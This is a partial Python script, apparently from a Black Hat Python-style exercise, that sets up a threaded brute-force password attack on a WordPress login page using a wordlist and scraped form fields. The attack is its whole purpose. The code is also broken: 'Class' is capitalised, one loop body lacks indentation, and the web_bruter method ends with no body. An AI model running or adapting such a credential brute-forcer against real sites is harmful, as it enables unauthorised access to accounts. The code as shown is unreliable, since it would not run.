from io import BytesIO
from lxml import etree
from queue import Queue

import requests
import sys
import threading
import time

SUCCESS = 'Welcome to WordPress!'
TARGET = "http://url/wordpress/wp-login.php"
WORDLIST = '/home/black/bhp/bhp/cain.txt'

def get_words():
    with open(WORDLIST) as f:
        raw_words = f.read()

    words = Queue()
    for word in raw_words.split():
        words.put(word)
    return words

def get_params(content):
    params = dict()
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parser=parser)
    for elem in tree.findall('//input'): # 找出所有input元素
        name = elem.get('name')
        if name is not None:
            params[name] = elem.get('value', None)
    return params

Class Bruter:
    def __init__(self, username, url):
        self.username = username
        self.url = url
        self.found = False
        print(f'\nBrute Force Attack beginning on {url}.\n')

    def run_bruterforce(self, passwords):
        for _ in range(10):
        t = threading.Thread(target=self.web_bruter, args=(passwords,))
        t.start()

    def web_bruter(self, passwords):